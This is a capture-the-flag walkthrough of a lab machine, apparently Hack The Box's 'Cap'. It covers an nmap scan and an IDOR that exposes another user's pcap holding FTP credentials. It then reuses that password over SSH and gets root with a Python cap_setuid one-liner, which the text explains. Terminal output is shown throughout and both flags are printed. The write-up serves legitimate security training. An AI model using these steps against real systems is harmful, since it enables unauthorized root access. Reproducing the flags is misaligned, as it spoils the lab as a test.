
**Task 1**

Q) How many TCP ports are open?
--> 3
Solution -- >nmap -Pn 10.129.5.11 ( need to connect to the openvpn machine vpn using the sudo openvpn machines_us-free-3.ovpn )

```
nmap -Pn 10.129.5.11     

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 18:15 IST
Nmap scan report for 10.129.5.11
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.09 sec
```


**Task 2**

Q) After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

--> data

Soution --> After connecting to the openvpn , visit the site in the browser and then go to the security snapshots page in the left side of the page and then note the url is redirected to the 
**http://10.129.5.11/data/1** , so the something is data

**Task 3**

Q) Are you able to get to other users' scans?

--> yes

Solution : --> because when we change the data/1 to the data/0 there is a more message in that , so the answer is yes

**Task 4**

Q) What is the ID of the PCAP file that contains sensative data?
--> 0

Solution: the data/0

**Task 5**

Q) Which application layer protocol in the pcap file can the sensetive data be found in?
--> ftp (in the whireshark)

**Task 6**

Q) We've managed to collect nathan's FTP password. On what other service does this password work?

--> SSH used to login via nanthan

**Submit the flag located in the nathan user's home directory.**
```
ssh nathan@10.129.5.11
The authenticity of host '10.129.5.11 (10.129.5.11)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.5.11' (ED25519) to the list of known hosts.
nathan@10.129.5.11's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan 20 13:43:14 UTC 2026

  System load:           0.08
  Usage of /:            37.1% of 8.73GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.5.11
  IPv6 address for eth0: dead:beef::250:56ff:feb0:cae4

  => There are 3 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt
500d5a1fd248d6de60d4f971b3137a6e
nathan@cap:~$ whoami
nathan
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# ls
user.txt
root@cap:~# cat user.txt 
500d5a1fd248d6de60d4f971b3137a6e
```

**Submit the flag located in root's home directory.**

```
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# ls
user.txt
root@cap:~# cat user.txt 
500d5a1fd248d6de60d4f971b3137a6e
root@cap:~# whoami
root
root@cap:~# ls
user.txt
root@cap:~# ccd /root

Command 'ccd' not found, did you mean:

  command 'hcd' from deb hfsutils (3.2.6-14)
  command 'cct' from deb proj-bin (6.3.1-1)
  command 'ccx' from deb calculix-ccx (2.11-1build3)
  command 'cdcd' from deb cdcd (0.6.6-13.1build2)
  command 'mcd' from deb mtools (4.0.24-1)
  command 'bcd' from deb bsdgames (2.17-28build1)
  command 'cccd' from deb cccd (0.3beta4-7.1build1)
  command 'cc' from deb gcc (4:9.3.0-1ubuntu2)
  command 'cc' from deb clang (1:10.0-50~exp1)
  command 'cc' from deb pentium-builder (0.21ubuntu1)
  command 'cc' from deb tcc (0.9.27-8)
  command 'ccr' from deb codecrypt (1.8-1build1)

Try: apt install <deb name>

root@cap:~# ls- la

Command 'ls-' not found, did you mean:

  command 'lsd' from snap lsd (0.16.0)
  command 'ls' from deb coreutils (8.30-3ubuntu2)
  command 'lsh' from deb lsh-client (2.1-12build3)
  command 'lsm' from deb lsm (1.0.4-1)
  command 'lsc' from deb livescript (1.6.0+dfsg-1)
  command 'lsw' from deb suckless-tools (44-1)

See 'snap info <snapname>' for additional versions.

root@cap:~# ls -la
total 28
drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
drwx------ 2 nathan nathan 4096 May 23  2021 .cache
-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
-r-------- 1 nathan nathan   33 Jan 19 18:53 user.txt
root@cap:~# cd
root@cap:~# ls
user.txt
root@cap:~# dir
user.txt
root@cap:~# pwd
/home/nathan
root@cap:~# cd ..
root@cap:/home# pwd
/home
root@cap:/home# cd
root@cap:~# cd root
bash: cd: root: No such file or directory
root@cap:~# cd /root
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt 
4085229017659d34e4313c14f5305be6
```

### The Starting State

When you type `python3.8`, the operating system starts the program. It looks at who you are and assigns that identity to the program.

- **You:** "I am Nathan (ID 1000)."
    
- **Python:** "Okay, I am running as Nathan (ID 1000)."
    

At this point, even though Python _could_ become root, it is currently just a regular program.

### 2. The Command: `os.setuid(0)`

This is the moment you use the magic marker.

- **Command:** `os.setuid(0)` literally means "Operating System, **Set** my **U**ser **ID** to **0**."
    
- **The Check:** The Operating System looks at the Python binary. It sees the `cap_setuid` capability (the magic marker) and says, "Okay, you are allowed to do this."
    
- **The Result:** The Python process changes from **ID 1000 (Nathan)** to **ID 0 (Root)**.
    

### 3. The Command: `os.system("/bin/bash")`

Now that the Python program is running as Root, you need a way to control it.

- **Command:** "Open a new terminal window (`/bin/bash`)."
    
- **Result:** Because the Python program is now Root, the terminal it opens is also Root.
    

### Summary

If you didn't use that one-liner, here is what would happen:

1. You run Python.
    
2. Python starts as **Nathan**.
    
3. You run `/bin/bash` from Python.
    
4. The new shell starts as **Nathan**.
    
5. **Result:** No root access.
